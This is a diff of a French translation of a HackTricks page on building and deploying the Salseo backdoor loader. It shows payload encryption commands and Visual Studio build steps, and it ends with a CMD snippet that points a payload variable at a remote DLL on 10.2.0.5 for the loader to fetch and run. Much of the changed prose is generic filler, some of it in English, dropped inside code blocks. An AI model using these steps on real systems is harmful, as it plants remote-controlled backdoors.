@@ -4,7 +4,7 @@
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
+* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? Ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
 * Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
 * **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
@@ -39,13 +39,15 @@ python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.
 ```
 ### Windows
 
-Un backdoor est un moyen d'accéder à un système informatique sans être détecté. Il existe plusieurs types de backdoors, mais ils ont tous le même objectif : permettre à un attaquant d'accéder à un système à distance et d'exécuter des commandes sans que l'utilisateur ne le sache.
+Un backdoor est un moyen d'accéder à un système informatique sans être détecté. Il existe plusieurs types de backdoors, mais ils ont tous le même objectif : permettre à un attaquant d'accéder à un système à distance et d'exécuter des commandes sans être détecté.
 
-Les backdoors peuvent être installés de différentes manières, notamment par le biais de logiciels malveillants, de vulnérabilités du système ou de techniques d'ingénierie sociale. Une fois installé, un backdoor peut être utilisé pour voler des informations sensibles, exécuter des commandes malveillantes ou même prendre le contrôle complet du système.
+Les backdoors peuvent être installés de différentes manières, notamment par le biais de logiciels malveillants, de vulnérabilités du système ou de l'exploitation de mots de passe faibles. Une fois installé, un backdoor peut permettre à un attaquant de voler des informations sensibles, de modifier des fichiers, d'installer d'autres logiciels malveillants ou même de prendre le contrôle complet du système.
 
-Il existe plusieurs outils et techniques pour détecter et supprimer les backdoors sur les systèmes Windows. Certains outils populaires incluent des scanners de vulnérabilités, des antivirus et des pare-feu. Il est également important de garder votre système à jour avec les derniers correctifs de sécurité pour réduire les risques d'exploitation de vulnérabilités connues.
+Il existe plusieurs outils et techniques pour détecter et supprimer les backdoors sur les systèmes Windows. Certains outils populaires incluent des scanners de vulnérabilités, des antivirus et des pare-feu. Il est également important de maintenir votre système à jour avec les derniers correctifs de sécurité pour réduire les risques d'exploitation de vulnérabilités connues.
 
-En tant que professionnel de la sécurité, il est essentiel de comprendre les backdoors et les techniques utilisées pour les installer et les détecter. Cela vous permettra de protéger efficacement les systèmes contre les attaques et de réagir rapidement en cas de compromission.
+Pour prévenir les backdoors, il est essentiel de suivre de bonnes pratiques de sécurité, telles que l'utilisation de mots de passe forts, l'installation de logiciels provenant de sources fiables, la mise en place de pare-feu et la sensibilisation à la sécurité informatique. En outre, il est recommandé de réaliser régulièrement des audits de sécurité pour détecter et corriger les éventuelles vulnérabilités.
+
+En résumé, les backdoors sont des menaces sérieuses pour la sécurité des systèmes Windows. Il est essentiel de prendre des mesures pour les détecter, les prévenir et les éliminer afin de protéger vos informations sensibles et votre système contre les attaques.
 ```
 EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
 EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
@@ -99,23 +101,23 @@ Ouvrez le projet SalseoLoader à l'aide de Visual Studio.
 
 ### Ajoutez avant la fonction principale: \[DllExport]
 
-![](<../.gitbook/assets/image (2) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png>)
 
 ### Installez DllExport pour ce projet
 
 #### **Outils** --> **Gestionnaire de packages NuGet** --> **Gérer les packages NuGet pour la solution...**
 
-![](<../.gitbook/assets/image (3) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png>)
 
-#### **Recherchez le package DllExport (en utilisant l'onglet Parcourir) et appuyez sur Installer (et acceptez la fenêtre contextuelle)**
+#### **Recherchez le package DllExport (utilisez l'onglet Parcourir) et appuyez sur Installer (et acceptez la fenêtre contextuelle)**
 
 ![](<../.gitbook/assets/image (4) (1) (1) (1) (1).png>)
 
 Dans le dossier de votre projet, les fichiers suivants sont apparus : **DllExport.bat** et **DllExport\_Configure.bat**
 
-### **Désinstallez** DllExport
+### **Désinstallez DllExport**
 
-Appuyez sur **Désinstaller** (oui, c'est bizarre mais faites-moi confiance, c'est nécessaire)
+Appuyez sur **Désinstaller** (oui, c'est étrange mais faites-moi confiance, c'est nécessaire)
 
 ![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)
 
@@ -141,7 +143,7 @@ Sélectionnez **Type de sortie = Bibliothèque de classes** (Projet --> Proprié
 
 ![](<../.gitbook/assets/image (10) (1).png>)
 
-Sélectionnez **Plateforme x64** (Projet --> Propriétés de SalseoLoader --> Général --> Plateforme cible = x64)
+Sélectionnez **Plateforme x64** (Projet --> Propriétés de SalseoLoader --> Général --> Cible de la plateforme = x64)
 
 ![](<../.gitbook/assets/image (9) (1) (1).png>)
 
@@ -176,11 +178,11 @@ CMD (Command Prompt) is a command-line interpreter for Windows operating systems
 
 CMD is a powerful tool for hackers as it allows them to execute commands and scripts on a target system. By gaining access to CMD, hackers can perform a wide range of activities, such as creating backdoors, stealing data, and launching attacks.
 
-To exploit CMD, hackers often use techniques like command injection, where they inject malicious commands into vulnerable applications that use CMD to execute system commands. This allows them to execute arbitrary commands on the target system and gain unauthorized access.
+To exploit CMD, hackers often use techniques like social engineering, phishing, or exploiting vulnerabilities in the target system. Once they gain access to CMD, they can execute commands remotely and control the target system.
 
-To protect against CMD-based attacks, it is important to ensure that all applications and systems are properly secured and regularly updated. Additionally, it is recommended to use strong passwords, implement access controls, and monitor system logs for any suspicious activity.
+To protect against CMD exploitation, it is important to keep your system up to date with the latest security patches, use strong passwords, and be cautious of suspicious emails or websites. Regularly monitoring your system for any unauthorized access or unusual activities can also help detect and prevent CMD exploitation.
 
-CMD can be a valuable tool for both hackers and system administrators. By understanding its capabilities and vulnerabilities, you can better protect your systems and networks from potential attacks.
+CMD is a versatile tool that can be used for both legitimate purposes and malicious activities. Understanding its capabilities and taking necessary precautions can help ensure the security of your system.
 ```
 set pass=password
 set payload=http://10.2.0.5/evilsalsax64.dll.txt
